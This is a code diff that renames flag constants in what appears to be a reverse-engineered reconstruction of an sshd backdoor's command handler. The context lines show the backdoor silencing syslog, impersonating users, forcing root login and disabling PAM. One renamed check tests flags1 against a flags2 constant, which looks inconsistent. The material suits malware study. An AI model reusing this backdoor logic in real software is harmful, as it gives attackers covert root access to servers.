@@ -108,14 +108,14 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 
 			if(cmd_type == 2){
 				size = f.kctx.args.u.size;
-				if(TEST_FLAG(f.kctx.args.flags1, CMDF_NO_EXTENDED_SIZE)){
+				if(TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_NO_EXTENDED_SIZE)){
 					if(f.kctx.args.u.size) break;
 					data_s1 = 0;
 					size = 0x39;
 					data_ptr = f.kctx.payload.body.data;
 					data_s2 = 0;
 				} else {
-					if(TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)){
+					if(TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_IMPERSONATE)){
 						size = f.kctx.args.u.size + sizeof(uid_t) + sizeof(gid_t);
 					}
 					data_s1 = size;
@@ -178,10 +178,10 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 				} while(!sigcheck_result);
 				ctx->sshd_host_pubkey_idx = f.key_cur_idx;
 
-				if(cmd_type == 2 && TEST_FLAG(f.kctx.args.flags1, CMDF_NO_EXTENDED_SIZE)){
+				if(cmd_type == 2 && TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_NO_EXTENDED_SIZE)){
 					if(!data_ptr) break;
 					int data_offset = 0;
-					if(TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)){
+					if(TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_IMPERSONATE)){
 						data_offset = SIZE_SYSTEM_EXTRA;
 						if(f.body_size <= SIZE_SYSTEM_EXTRA) break;
 					}
@@ -228,7 +228,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 					if(f.payload_size < body_offset) break;
 					after_payload_size_check:
 					if(f.payload_size - body_offset < data_s1) break;
-					if(TEST_FLAG(f.kctx.args.flags1, CMDF_SETLOGMASK)
+					if(TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_SETLOGMASK)
 					&& ctx->libc_imports
 					&& ctx->libc_imports->setlogmask
 					){
@@ -236,7 +236,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 						ctx->sshd_log_ctx->syslog_disabled = TRUE;
 					} else {
 						ctx->sshd_log_ctx->syslog_disabled = FALSE;
-						if((f.kctx.args.flags1 & (CMDF_SETLOGMASK|CMDF_8BYTES)) ==  (CMDF_SETLOGMASK|CMDF_8BYTES)){
+						if((f.kctx.args.flags1 & (X_FLAGS1_SETLOGMASK|X_FLAGS1_8BYTES)) ==  (X_FLAGS1_SETLOGMASK|X_FLAGS1_8BYTES)){
 							break;
 						}
 						ctx->uid = ctx->libc_imports->getuid();
@@ -248,7 +248,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 
 						if(cmd_type){
 							if(cmd_type == 1){
-								if(!TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)
+								if(!TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_IMPERSONATE)
 								&& !ctx->sshd_ctx->permit_root_login_ptr) break;
 								goto j_payload_main;
 							}
@@ -296,7 +296,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 						
 							offsets.fields.sshbuf.value = 0;
 							tmp.fields.kex.kex_qword_index = -1;
-							if(TEST_FLAG(f.kctx.args.flags2, CMDF_CHANGE_MONITOR_REQ)){
+							if(TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_CHANGE_MONITOR_REQ)){
 								tmp.value = (*(u16 *)&f.kctx.args.flags3 >> 6) & 0x7F;
 							}
 							offsets.fields.kex.kex_qword_index = tmp.fields.kex.kex_qword_index;
@@ -344,9 +344,9 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 								if(cmd_type){
 									if(cmd_type == 1){
 										if(sshd_patch_variables(
-											f.kctx.args.flags2 & CMDF_IMPERSONATE,
-											TEST_FLAG(f.kctx.args.flags1, CMDF_DISABLE_PAM),
-											TEST_FLAG(f.kctx.args.flags2, CMDF_CHANGE_MONITOR_REQ),
+											f.kctx.args.flags2 & X_FLAGS2_IMPERSONATE,
+											TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_DISABLE_PAM),
+											TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_CHANGE_MONITOR_REQ),
 											f.kctx.args.u.value[0],
 											ctx
 										)){
@@ -355,7 +355,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										break;
 									} else {
 										if(cmd_type != 2){
-											if((f.kctx.args.flags2 & CMDF_PSELECT) == CMDF_PSELECT){
+											if((f.kctx.args.flags2 & X_FLAGS2_PSELECT) == X_FLAGS2_PSELECT){
 												if(!ctx->libc_imports->exit) break;
 												if(!ctx->libc_imports->pselect) break;
 												f.data.timespec.tv_sec = 5;
@@ -373,7 +373,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										uid_t tgt_uid = 0, tgt_gid = 0;
 										data_s1 = (short)data_s1;
 
-										if(TEST_FLAG(f.kctx.args.flags1, CMDF_IMPERSONATE)){
+										if(TEST_FLAG(f.kctx.args.flags1, X_FLAGS2_IMPERSONATE)){
 											if(data_s1 <= SIZE_SYSTEM_EXTRA) break;
 											tgt_uid = *(uid_t *)(data_ptr2 + 0);
 											tgt_gid = *(gid_t *)(data_ptr2 + sizeof(uid_t));
@@ -433,13 +433,13 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 											*ctx->sshd_ctx->permit_root_login_ptr = PERMIT_YES;
 										}
 									}
-									if(TEST_FLAG(f.kctx.args.flags1, CMDF_DISABLE_PAM)){
+									if(TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_DISABLE_PAM)){
 										if(!ctx->sshd_ctx->use_pam_ptr) break;
 										if(*ctx->sshd_ctx->use_pam_ptr > TRUE) break;
 										*ctx->sshd_ctx->use_pam_ptr = FALSE;
 
 										f.u.sock.socket_fd = -1;
-										if(TEST_FLAG(f.kctx.args.flags1, CMDF_SOCKET_INDEX)){
+										if(TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_SOCKET_INDEX)){
 											if(!sshd_get_usable_socket(
 												&f.u.sock.socket_fd,
 												(f.kctx.args.flags2 >> 3) & 0xF,
